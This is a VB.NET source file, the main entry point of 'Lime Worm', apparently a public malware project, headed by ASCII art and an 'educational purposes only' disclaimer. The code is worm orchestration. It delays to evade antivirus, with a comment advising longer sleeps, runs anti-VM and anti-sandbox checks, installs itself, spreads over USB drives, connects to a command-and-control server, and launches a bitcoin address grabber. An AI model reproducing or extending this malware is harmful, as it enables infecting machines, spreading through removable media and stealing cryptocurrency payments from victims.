
'##################################################################
'##        N Y A N   C A T  |||   Updated on Apr./24/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                     .. Lime Worm v0.5.3 ..                   ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##           https://github.com/NYAN-x-CAT/Lime-Worm            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################


Imports System.Threading

Public Class Main
    Public Shared C As New TCP
    Public Shared SPL = "|'L'|"

    Public Shared Sub Main()

        Thread.Sleep(1000) 'Sleep is always a good start for any malware, 10sec+ for better AV bypass

        Dim createdNew As Boolean 'Making sure that only 1 process is running
        Settings.NMT = New Mutex(True, Settings.MTX, createdNew)
        Try
            If Not createdNew Then End
        Finally
            If createdNew Then
                Settings.NMT.ReleaseMutex()
            End If
        End Try

        If Settings.ANTI Then 'Lets see if this PC is Fake
            Call VMware()
            Call Virtualbox()
            Call Sandboxie()
            Call Win_XP()
        End If

        Call Installation.INS() 'Install worm

        If Settings.USB Then 'Thread to USB spread
            Dim T1 As Thread = New Threading.Thread(AddressOf USB_SP.StartSP)
            T1.Start()
        End If

        TCP.CON() 'Start TCP connection to SERVER

        Dim CHK As Thread = New Thread(AddressOf CHK_REG.Checking) 'Thread to Cheking status
        CHK.Start()

        If Settings.BTC_ADDR.Length > 25 Then 'Check and start bitcoin grabber
            Dim _BTC As Thread = New Thread(AddressOf BTC._BTC_ST)
            _BTC.SetApartmentState(ApartmentState.STA)
            _BTC.Start()
        End If


    End Sub


End Class

